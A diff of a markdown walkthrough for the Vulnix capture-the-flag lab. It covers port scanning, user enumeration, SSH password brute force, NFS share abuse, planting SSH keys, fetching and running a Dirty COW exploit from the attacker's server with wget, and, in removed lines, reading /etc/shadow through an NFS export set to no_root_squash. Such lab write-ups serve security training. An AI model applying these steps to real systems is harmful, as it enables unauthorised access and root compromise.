@@ -1,16 +1,10 @@
-# HackLAB: Vulnix ~Vulnhub Writeup
-CTF machine Writeup
-Author: Reboot User
-
-Download link: https://download.vulnhub.com/hacklab/Vulnix.7z
-
-# SCANNING
+# VULNIX writeup
 
 1. **nmap -p- Target_ip**
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled.png)
 
- **2.   nmap -sV -A --script vuln Target_ip** 
+ **2.   nmap -sV -A —script vuln Target_ip** 
 
 ```jsx
 root@v5ha1i:~# nmap -sV -A --script Vuln 192.168.122.130
@@ -147,7 +141,7 @@ root@v5ha1i:~#
 
 ### User enumeration  (PORT-79)
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%201.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%201.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%201.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%201.png)
 
 ***Using tool finger-user-enum to find users in target system
 
@@ -155,23 +149,23 @@ Download finger-user-enum using command **git clone [https://github.com/pentestm
 
 **./finger-user-enum.pl -U <wordlist> -t <target>**
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%202.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%202.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%202.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%202.png)
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%203.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%203.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%203.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%203.png)
 
 ### LOGIN USING SSH as user
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%204.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%204.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%204.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%204.png)
 
 **Bruteforce password for ssh using hydra**
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%205.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%205.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%205.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%205.png)
 
 ***successfuly login using ssh
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%206.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%206.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%206.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%206.png)
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%207.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%207.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%207.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%207.png)
 
 ## EXPLOITATION METHOD 1
 
@@ -179,13 +173,13 @@ Found user vulnix
 
 Mounting nfs sharing
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%208.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%208.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%208.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%208.png)
 
 ***Permission denied
 
 Add user vulnix with same user and group id as target system and then try to access shared folder
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%209.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%209.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%209.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%209.png)
 
 ## EXPLOITATION METHOD 2
 
@@ -193,15 +187,15 @@ Add user vulnix with same user and group id as target system and then try to acc
 
  
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2010.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2010.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2010.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2010.png)
 
  1.  showmount -e Target
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2011.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2011.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2011.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2011.png)
 
  2.  **make share directory in /tmp dir**
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2012.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2012.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2012.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2012.png)
 
  3.  **mount -t nfs target:/home/vulnix /tmp/share**
 
@@ -209,7 +203,7 @@ check permission of /tmp/share (user=nobody and group=nobody)
 
 **share directory is not accessible directly
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2013.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2013.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2013.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2013.png)
 
 **Cloning user vulnix using python script**
 
@@ -217,45 +211,45 @@ check permission of /tmp/share (user=nobody and group=nobody)
 
 Python script to clone user.
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2014.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2014.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2014.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2014.png)
 
  4.  Make user vulnix using command = **adduser vulnix**  and assign password
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2015.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2015.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2015.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2015.png)
 
 Before running python script delete vulnix user from /etc/passwd and save.
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2016.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2016.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2016.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2016.png)
 
  5.  Make sure to give write permission for other users to /etc/passwd file.
 
 **chmod 777 /etc/passwd**
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2017.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2017.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2017.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2017.png)
 
 ***Login with another user and copy python script there.
 
  6.  Run script using command = **sudo python3 nfs-exploit.py**
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2018.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2018.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2018.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2018.png)
 
 ***If it gives above error, then add in /etc/sudoers file
 
 **<user>     ALL=(ALL:ALL) ALL**
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2019.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2019.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2019.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2019.png)
 
  7.  Run script again
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2020.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2020.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2020.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2020.png)
 
  8.  Now we got user and group id for user vulnix
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2021.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2021.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2021.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2021.png)
 
  9.  Login with vulnix user and try to access /tmp/share directory.
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2022.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2022.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2022.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2022.png)
 
 *** Access successfully
 
@@ -263,29 +257,29 @@ Before running python script delete vulnix user from /etc/passwd and save.
 
  1.  Generate ssh key using **ssh-keygen** command.
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2023.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2023.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2023.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2023.png)
 
  2.   Copy id_rsa.pub 
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2024.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2024.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2024.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2024.png)
 
  3.  make .ssh directory in /tmp/share/ directory from vulnix user 
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2025.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2025.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2025.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2025.png)
 
  4.  make file authorized_keys in .ssh and paste public key there.
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2026.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2026.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2026.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2026.png)
 
  5.  login using **ssh vulnix@target_ip**
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2027.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2027.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2027.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2027.png)
 
 # PRIVILEGE ESCALATION
 
  1.  Download dirty_cow exploit from exploit-db
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2028.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2028.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2028.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2028.png)
 
  2.  Compile it using command
 
@@ -293,13 +287,13 @@ Before running python script delete vulnix user from /etc/passwd and save.
 
 And share it using python server 
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2029.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2029.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2029.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2029.png)
 
- 3.  Download exploit using wget command
+ 3.  Download exploit in target system using wget command
 
 **wget [http://192.168.122.1](http://192.168.122.135)45:8000/exp .** 
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2030.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2030.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2030.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2030.png)
 
  4. **./exp** (to exploit)
 
@@ -307,81 +301,24 @@ It will ask you to enter any password
 
 *** This script will pawn root user as firefart user
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2031.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2031.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2031.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2031.png)
 
  5.  Login with ssh as firefart user 
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2032.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2032.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2032.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2032.png)
 
  6.  Open /etc/passwd file
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2033.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2033.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2033.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2033.png)
 
  7.  change firefart to root
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2034.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2034.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2034.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2034.png)
 
 8.  Then again login with ssh as root user
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2035.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2035.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2035.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2035.png)
 
 Finally we got root shell and flag in trophy.txt
 
-![Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2036.png](Hacklab%20VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2036.png)
-
-# Privilege escalation (Another method)
-
-Check sudoers list
-
-![Vulnix%20f8cd8b04dabd46119da614d483e446b5/Untitled.png](Vulnix%20f8cd8b04dabd46119da614d483e446b5/Untitled.png)
-
-/etc/exports is writable
-
-use command **sudoedit /etc/exports** to write in file
-
-![Vulnix%20f8cd8b04dabd46119da614d483e446b5/Untitled%201.png](Vulnix%20f8cd8b04dabd46119da614d483e446b5/Untitled%201.png)
-
-Add following lines in /etc/exports file.
-
-```jsx
-**/root     *(rw,no_root_squash)
-/etc      *(rw,no_root_squash)**
-```
-
-![Vulnix%20f8cd8b04dabd46119da614d483e446b5/Untitled%202.png](Vulnix%20f8cd8b04dabd46119da614d483e446b5/Untitled%202.png)
-
-![Vulnix%20f8cd8b04dabd46119da614d483e446b5/Untitled%203.png](Vulnix%20f8cd8b04dabd46119da614d483e446b5/Untitled%203.png)
-
-After this restart target machine
-
-![Vulnix%20f8cd8b04dabd46119da614d483e446b5/Untitled%204.png](Vulnix%20f8cd8b04dabd46119da614d483e446b5/Untitled%204.png)
-
-Create directory root and etc in /tmp folder.
-
-![Vulnix%20f8cd8b04dabd46119da614d483e446b5/Untitled%205.png](Vulnix%20f8cd8b04dabd46119da614d483e446b5/Untitled%205.png)
-
-Mount root and etc directory.
-
-**mount -t nfs 192.168.122.130:/root /tmp/rOOt**
-
-**mount -t nfs 192.168.122.130:/etc /tmp/etc**
-
-![Vulnix%20f8cd8b04dabd46119da614d483e446b5/Untitled%206.png](Vulnix%20f8cd8b04dabd46119da614d483e446b5/Untitled%206.png)
-
-cd /tmp/etc
-
-![Vulnix%20f8cd8b04dabd46119da614d483e446b5/Untitled%207.png](Vulnix%20f8cd8b04dabd46119da614d483e446b5/Untitled%207.png)
-
-copy password of any user from /etc/shadow file 
-
-![Vulnix%20f8cd8b04dabd46119da614d483e446b5/Untitled%208.png](Vulnix%20f8cd8b04dabd46119da614d483e446b5/Untitled%208.png)
-
-cd /tmp/etc
-
-Paste that password in passwd file in root user.
-
-![Vulnix%20f8cd8b04dabd46119da614d483e446b5/Untitled%209.png](Vulnix%20f8cd8b04dabd46119da614d483e446b5/Untitled%209.png)
-
-Then take shell of root using ssh
-
-![Vulnix%20f8cd8b04dabd46119da614d483e446b5/Untitled%2010.png](Vulnix%20f8cd8b04dabd46119da614d483e446b5/Untitled%2010.png)
+![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2036.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2036.png)
